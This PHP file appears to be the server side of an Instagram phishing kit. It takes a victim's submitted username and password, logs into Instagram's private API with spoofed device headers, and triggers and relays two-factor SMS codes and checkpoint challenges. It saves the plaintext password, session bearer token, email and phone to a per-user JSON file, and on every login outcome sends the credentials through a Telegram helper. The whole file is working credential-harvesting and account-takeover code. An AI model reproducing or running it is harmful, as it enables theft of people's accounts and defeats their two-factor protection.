<?php
session_start();

require 'encrypt.php';
require 'request.php';
require 'telegram.php';
require_once 'account.php';

use App\Headers\HeadersList;
use App\Encrypt\encrypts;
use App\Request\Requests;
use App\Telegrams\telegram;
use App\Account\account;


class Login
{
    private $headersList;
    private $enc;
    private $Requests;
    private $telegram;
    private $logFile;

    public function __construct()
    {
        $this->headersList = new HeadersList();
        $this->enc = new encrypts();
        $this->Requests = new Requests();
        $this->telegram = new telegram();
    }

    public function logfile($username)
    {
        return  '../log/' . $username . 'login_log.txt';
    }

    public function log($message, $endpoint, $username)
    {
        $logMessage = $endpoint . " - " . $message . PHP_EOL;
        file_put_contents($this->logFile($username), $logMessage, FILE_APPEND);
    }

    public function trusted_friend()
    {
        $headers = $this->headersList->localheaders();

        return $this->Requests->RequestGETendpoint("trusted_friend/get_non_expired_requests_info/", $headers);
    }

    public function challengeGET($path, $context, $username)
    {
        $x_id_device = $this->headersList->X_Ig_Device_Id;
        $x_Android_Id = $this->headersList->X_Ig_Android_Id;

        $url = "https://i.instagram.com/api/v1" . $path . "?guid=$x_id_device&device_id=$x_Android_Id&challenge_context=" . $context;

        $headers = $this->headersList->localheaders();

        $response = $this->Requests->RequestGETnotendpoint($url, $headers);

        $data = json_decode($response, true);

        if (isset($data['step_data']['phone_number'])) {
            $_SESSION['user_phone'] = $data['step_data']['phone_number'];
        }

        if (isset($data['step_data']['email'])) {
            $_SESSION['user_email'] = $data['step_data']['email'];
        }

        return [
            'body' => $response,
        ];
    }

    public function challengeCODE($challenge_context, $choice, $username)
    {

        $headers = $this->headersList->localheaders();

        $post = [
            "choice" => $choice,
            "has_follow_up_screens" => "0",
            "bk_client_context" => '{"bloks_version":"' . $this->headersList->X_Bloks_Version_Id . '","styles_id":"instagram"}',
            "challenge_context" => $challenge_context,
            "bloks_versioning_id" => $this->headersList->X_Bloks_Version_Id,
        ];

        $response = $this->Requests->RequestPostendpoint("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $post);

        $this->log('Challence Code Verify', $response['body'], $username);

        $this->processResponse($response['body'], $username);
    }

    private function processResponse($responseBody, $username)
    {
        $es = json_decode($responseBody, true);
        $mm = $es['layout']['bloks_payload']['tree']['㐟']['#'];
        $shs = explode(" ", $mm);

        $perf_logging_id = $this->extractPerfLoggingId($shs);
        if ($perf_logging_id !== null) {
            $this->savePerfLoggingId($perf_logging_id, $username);
        }
    }

    private function extractPerfLoggingId($shs)
    {
        for ($i = 885; $i <= 887; $i++) {
            $id = preg_replace('/\D/', '', $shs[$i]);
            if (strlen($id) >= 3 && strlen($id) <= 18) {
                return $id;
            }
        }
        return null;
    }

    private function savePerfLoggingId($perf_logging_id, $username)
    {
        $jssson = ["perf_logging_id" => $perf_logging_id];
        $d = json_encode($jssson);
        $filename = __DIR__ . '/logged/perf_logging_id' . $username . '.json';
        file_put_contents($filename, $d);
    }

    public function challengeSTEP($user_id, $cni, $nonce_code, $challenge_context)
    {

        $headers = $this->headersList->localheaders();

        $post = [
            "user_id" => $user_id,
            "cni" => $cni,
            "nonce_code" => $nonce_code,
            "bk_client_context" => '{"bloks_version":"' . $this->headersList->X_Bloks_Version_Id . '","styles_id":"instagram"}',
            "fb_family_device_id" => $this->headersList->X_Ig_Family_Device_Id,
            "challenge_context" => $challenge_context,
            "bloks_versioning_id" => $this->headersList->X_Bloks_Version_Id,
            "get_challenge" => "true",
        ];

        $response = $this->Requests->RequestPostendpoint("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $post);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }

    public function challengeCANCEL($context)
    {

        $headers = $this->headersList->localheaders();

        $post = [
            "bk_client_context" => array(
                "bloks_version" => $this->headersList->X_Bloks_Version_Id,
                "styles_id" => "instagram",
            ),
            "challenge_context" => $context,
            "bloks_versioning_id" => $this->headersList->X_Bloks_Version_Id,
        ];

        $response = $this->Requests->RequestPostendpoint("bloks/apps/com.instagram.challenge.navigation.rewind_challenge/", $headers, $post);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }


    public function twofactorSENDSMS($username, $two_factor_identifier)
    {

        $headers = [
            "Host: i.instagram.com",
            "X-Ig-App-Locale: tr_TR",
            "X-Ig-Device-Locale: tr_TR",
            "X-Ig-Mapped-Locale: tr_TR",
            'X-Pigeon-Session-Id: ' . $this->enc->generate_Session_Id(),
            'X-Pigeon-Rawclienttime: ' . $this->enc->generate_Rawclienttime(),
            "X-Ig-Bandwidth-Speed-Kbps: -1.000",
            "X-Ig-Bandwidth-Totalbytes-B: 0",
            "X-Ig-Bandwidth-Totaltime-Ms: 0",
            "X-Bloks-Version-Id: 8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07",
            "X-Ig-Www-Claim: 0",
            "X-Bloks-Is-Layout-Rtl: false",
            "X-Ig-Device-Id: " . $this->enc->generateRandomUUID(),
            "X-Ig-Family-Device-Id: " . $this->enc->generateRandomFamilyDeviceId(),
            "X-Ig-Android-Id: " . $this->enc->generateRandomAndroidId(),
            "X-Ig-Timezone-Offset: 10800",
            "X-Ig-Nav-Chain: AD1:login_landing:1:warm_start::",
            "X-Fb-Connection-Type: WIFI",
            "X-Ig-Connection-Type: WIFI",
            "X-Ig-Capabilities: 3brTv10=",
            "X-Ig-App-Id: 567067343352427",
            "Priority: u=3",
            "User-Agent: " . $this->enc->generateRandomUserAgent(),
            "Accept-Language: tr-TR, en-US",
            "Ig-Intended-User-Id: 0",
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "X-Fb-Http-Engine: Liger",
            "X-Fb-Client-Ip: True",
            "X-Fb-Server-Cluster: True",
        ];

        $post = [
            "two_factor_identifier" => $two_factor_identifier,
            "username" => $username,
            "guid" => $this->headersList->X_Ig_Device_Id,
            "device_id" => $this->headersList->X_Ig_Android_Id,
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/send_two_factor_login_sms/", $headers, $post);

        $this->log('Sms Faktor', $response['body'], $username);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }

    public function logged_in_user($bearer, $user_id, $username, $password, $fbid)
    {

        $headers = $this->headersList->appheaders($bearer, $user_id);

        $post = [
            "_uid" => $user_id,
            "device_id" => $this->headersList->X_Ig_Android_Id,
            "_uuid" => $this->headersList->X_Ig_Device_Id,
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/account_security_info/", $headers, $post);

        $this->log('Logged', $response['body'], $username);

        $data = json_decode($response['body'], true);

        $email = !empty($data['email']) ? $data['email'] : "Yok";
        $phone_number = !empty($data['phone_number']) ? $data['phone_number'] : "Yok";

        $userdata = [
            'username'   => $username,
            'password'   => $password,
            'token'      => $bearer,
            'id'         => $user_id,
            'email'      => $email,
            'phone'      => $phone_number,
            'fbid'       => $fbid,
        ];

        $jsondata = json_encode($userdata, JSON_PRETTY_PRINT);

        $filename = '../cookies' . '/' . $username . '.json';
        file_put_contents($filename, $jsondata);
    }

    public function login($username, $password)
    {

        $headers = $this->headersList->localheaders();

        $post = [
            'phone_id' => $this->headersList->X_Ig_Family_Device_Id,
            'enc_password' => $this->enc->encrypt($password),
            'username' => htmlspecialchars($username, ENT_QUOTES, 'UTF-8'),
            'guid' => $this->headersList->X_Ig_Device_Id,
            'device_id' => $this->headersList->X_Ig_Android_Id,
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/login/", $headers, $post);

        $this->log('Login', $response['body'], $username);

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
        ];
    }
}

$login = new Login;
$telegram = new telegram;
$account = new account;

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $username = htmlspecialchars($_POST["username"], ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars($_POST["password"], ENT_QUOTES, 'UTF-8');

    $trustted = $login->trusted_friend();
    $response = $login->login($username, $password);
    $data = json_decode($response['body'], true);

    $_SESSION['password'] = $password;

    if ($data['status'] === 'ok') {

        $headers = $response['headers'];
        $fbid_v2 = $data['logged_in_user']['fbid_v2'];

        $headers = explode("\r\n", $headers);

        foreach ($headers as $header) {
            if (strpos($header, 'ig-set-authorization') !== false) {
                $bearer = trim(explode(':', $header, 2)[1]);
                preg_match('|Bearer IGT:(.*):(.*)|isu', $bearer, $session_json);
                $session_json = json_decode(base64_decode($session_json[2]));
                $user_id = $session_json->ds_user_id;


                $login->logged_in_user($bearer, $user_id, $username, $password, $fbid_v2);


                $domain = filter_input(INPUT_SERVER, 'HTTP_HOST', FILTER_SANITIZE_URL);
                $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";

                $directory = dirname(__FILE__);
                $parentDirectory = dirname($directory);
                $grandParentDirectory = dirname($parentDirectory);
                $grandParentDirectoryName = basename($grandParentDirectory);

                $url = $protocol . $domain . "/" . $grandParentDirectoryName . "/form/app/s2s.php?username=" . urlencode($username);

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_TIMEOUT, 4);
                curl_exec($ch);
                curl_close($ch);

                $telegram->loginsucces($username, $password);
                $telegram->loginsucces($username, $password, true);
                echo trim('loginsucces');
            }
        }
    } else if ($data['error_type'] === 'two_factor_required') {

        $twonumber = $data['two_factor_info']['obfuscated_phone_number_2'];
        $two_factor_identifier = $data['two_factor_info']['two_factor_identifier'];

        $_SESSION['twonumber'] = $twonumber;
        $_SESSION['two_factor_identifier'] = $two_factor_identifier;


        if ($data['two_factor_info']['sms_two_factor_on'] && $data['two_factor_info']['totp_two_factor_on']) {
            $login->twofactorSENDSMS($username, $two_factor_identifier);
            echo trim('smsfactor');
        } else if ($data['two_factor_info']['sms_two_factor_on']) {
            $login->twofactorSENDSMS($username, $two_factor_identifier);
            echo trim('smsfactor');
        } else if ($data['two_factor_info']['totp_two_factor_on']) {
            echo trim('duofactor');
        }


        $telegram->loginfactor($username, $password);
        $telegram->loginfactor($username, $password, true);
    } else if ($data['error_type'] === 'invalid_user' || $data['error_type'] === 'bad_password' || $data['error_type'] === 'ip_block') {
        echo trim('wrongpassword');
        $telegram->loginwrongpass($username, $password);
        $telegram->loginwrongpass($username, $password, true);
    } else if ($data['error_type'] === 'checkpoint_challenge_required') {
        $telegram->loginchallenge($username, $password);
        $telegram->loginchallenge($username, $password, true);

        $path = $data['challenge']['api_path'];
        $context = $data['challenge']['challenge_context'];

        $_SESSION['context'] = $context;

        $login->challengeCANCEL($context);
        $response = $login->challengeGET($path, $context, $username);

        $data = json_decode($response['body'], true);
        $choice = $data['step_data']['choice'];
        $nonce_code = $data['nonce_code'];
        $user_id = $data['user_id'];
        $cni = $data['cni'];
        $challenge_context = $data['challenge_context'];

        $login->challengeSTEP($user_id, $cni, $nonce_code, $challenge_context);
        $login->challengeCODE($challenge_context, $choice, $username);

        echo trim('challengelogin');
    }
}
